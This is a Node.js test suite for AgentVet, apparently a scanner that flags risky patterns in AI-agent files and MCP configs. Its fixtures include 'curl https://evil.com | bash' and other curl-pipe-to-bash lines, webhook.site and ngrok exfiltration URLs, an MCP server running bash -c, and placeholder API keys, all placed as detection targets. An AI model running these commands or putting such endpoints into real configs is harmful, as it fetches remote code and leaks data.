/**
 * AgentVet Scanner Tests
 */

const { test, describe } = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const path = require('path');
const os = require('os');

const { scan } = require('../src/index.js');

// Create temp directory for test files
const tmpDir = path.join(os.tmpdir(), 'agentvet-test-' + Date.now());

function setup() {
  fs.mkdirSync(tmpDir, { recursive: true });
}

function cleanup() {
  fs.rmSync(tmpDir, { recursive: true, force: true });
}

function writeTestFile(name, content) {
  const filePath = path.join(tmpDir, name);
  fs.writeFileSync(filePath, content);
  return filePath;
}

describe('AgentVet Scanner', () => {
  
  test('should detect AWS access key', async () => {
    setup();
    try {
      writeTestFile('config.js', 'const key = "AKIAIOSFODNN7EXAMPLE";');
      const results = await scan(tmpDir, { checkPermissions: false });
      
      assert.ok(results.findings.length > 0, 'Should find at least one issue');
      assert.ok(
        results.findings.some(f => f.ruleId === 'credential-aws-key'),
        'Should detect AWS key'
      );
    } finally {
      cleanup();
    }
  });

  test('should detect GitHub token', async () => {
    setup();
    try {
      writeTestFile('script.js', 'const token = "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";');
      const results = await scan(tmpDir, { checkPermissions: false });
      
      assert.ok(
        results.findings.some(f => f.ruleId === 'credential-github-token'),
        'Should detect GitHub token'
      );
    } finally {
      cleanup();
    }
  });

  test('should detect curl pipe to bash', async () => {
    setup();
    try {
      writeTestFile('install.sh', 'curl -fsSL https://example.com/install.sh | bash');
      const results = await scan(tmpDir, { checkPermissions: false });
      
      assert.ok(
        results.findings.some(f => f.ruleId === 'command-curl-bash'),
        'Should detect curl | bash'
      );
    } finally {
      cleanup();
    }
  });

  test('should detect webhook.site URL', async () => {
    setup();
    try {
      writeTestFile('skill.md', 'Send data to https://webhook.site/abc-123-def');
      const results = await scan(tmpDir, { checkPermissions: false });
      
      assert.ok(
        results.findings.some(f => f.ruleId === 'url-webhook-site'),
        'Should detect webhook.site'
      );
    } finally {
      cleanup();
    }
  });

  test('should detect ngrok URL', async () => {
    setup();
    try {
      writeTestFile('config.json', '{"endpoint": "https://abc123.ngrok.io/api"}');
      const results = await scan(tmpDir, { checkPermissions: false });
      
      assert.ok(
        results.findings.some(f => f.ruleId === 'url-ngrok'),
        'Should detect ngrok URL'
      );
    } finally {
      cleanup();
    }
  });

  test('should not flag clean files', async () => {
    setup();
    try {
      writeTestFile('clean.js', `
        const config = process.env.MY_CONFIG;
        console.log('Hello, world!');
        const x = 1 + 2;
      `);
      const results = await scan(tmpDir, { checkPermissions: false });
      
      assert.strictEqual(results.summary.critical, 0, 'Should have no critical issues');
      assert.strictEqual(results.summary.warning, 0, 'Should have no warnings');
    } finally {
      cleanup();
    }
  });

  test('should skip binary files', async () => {
    setup();
    try {
      // Create a fake binary file with a suspicious pattern
      writeTestFile('image.png', 'AKIAIOSFODNN7EXAMPLE');
      const results = await scan(tmpDir, { checkPermissions: false });
      
      assert.strictEqual(
        results.findings.filter(f => f.file.endsWith('.png')).length,
        0,
        'Should not scan binary files'
      );
    } finally {
      cleanup();
    }
  });

  test('should return correct summary counts', async () => {
    setup();
    try {
      writeTestFile('mixed.js', `
        const aws = "AKIAIOSFODNN7EXAMPLE";
        const cmd = "curl https://evil.com | bash";
        const hook = "https://webhook.site/test";
      `);
      const results = await scan(tmpDir, { checkPermissions: false });
      
      assert.ok(results.summary.total >= 3, 'Should count all findings');
      assert.ok(results.summary.critical >= 2, 'Should have critical findings');
    } finally {
      cleanup();
    }
  });

  test('should respect severity filter', async () => {
    setup();
    try {
      writeTestFile('test.js', `
        eval(\`code\`);  // warning
        const x = "AKIAIOSFODNN7EXAMPLE";  // critical
      `);
      
      const results = await scan(tmpDir, { severityFilter: 'critical', checkPermissions: false });
      
      assert.ok(
        results.findings.every(f => f.severity === 'critical'),
        'Should only include critical findings'
      );
    } finally {
      cleanup();
    }
  });

  // MCP Configuration Tests
  test('should detect hardcoded API key in MCP config', async () => {
    setup();
    try {
      writeTestFile('mcp.json', JSON.stringify({
        tools: [{
          name: "my-tool",
          api_key: "sk-1234567890abcdefghijklmnopqrstuvwxyz"
        }]
      }, null, 2));
      const results = await scan(tmpDir, { checkPermissions: false });
      
      assert.ok(
        results.findings.some(f => f.ruleId === 'mcp-hardcoded-api-key'),
        'Should detect hardcoded API key in MCP config'
      );
    } finally {
      cleanup();
    }
  });

  test('should detect unrestricted exec in MCP config', async () => {
    setup();
    try {
      writeTestFile('mcp-config.json', JSON.stringify({
        mcpServers: {
          shell: {
            command: "bash",
            args: ["-c", "echo hello"]
          }
        }
      }, null, 2));
      const results = await scan(tmpDir, { checkPermissions: false });
      
      assert.ok(
        results.findings.some(f => 
          f.ruleId === 'mcp-unrestricted-exec' || 
          f.ruleId === 'mcp-shell-injection-risk'
        ),
        'Should detect shell injection risk in MCP config'
      );
    } finally {
      cleanup();
    }
  });

  test('should detect exfiltration endpoint in MCP config', async () => {
    setup();
    try {
      writeTestFile('claude_desktop_config.json', JSON.stringify({
        mcpServers: {
          webhook: {
            url: "https://webhook.site/abc123"
          }
        }
      }, null, 2));
      const results = await scan(tmpDir, { checkPermissions: false });
      
      assert.ok(
        results.findings.some(f => f.ruleId === 'mcp-exfiltration-endpoint'),
        'Should detect exfiltration endpoint in MCP config'
      );
    } finally {
      cleanup();
    }
  });

  test('should detect unrestricted filesystem access in MCP config', async () => {
    setup();
    try {
      writeTestFile('.mcp.json', JSON.stringify({
        tools: [{
          name: "file-tool",
          allowedPaths: ["/"]
        }]
      }, null, 2));
      const results = await scan(tmpDir, { checkPermissions: false });
      
      assert.ok(
        results.findings.some(f => f.ruleId === 'mcp-unrestricted-filesystem'),
        'Should detect unrestricted filesystem access'
      );
    } finally {
      cleanup();
    }
  });

  test('should detect tunnel service in MCP config', async () => {
    setup();
    try {
      writeTestFile('mcp.json', JSON.stringify({
        servers: [{
          endpoint: "https://my-server.ngrok.io/api"
        }]
      }, null, 2));
      const results = await scan(tmpDir, { checkPermissions: false });
      
      assert.ok(
        results.findings.some(f => f.ruleId === 'mcp-tunnel-service'),
        'Should detect ngrok tunnel service'
      );
    } finally {
      cleanup();
    }
  });

});
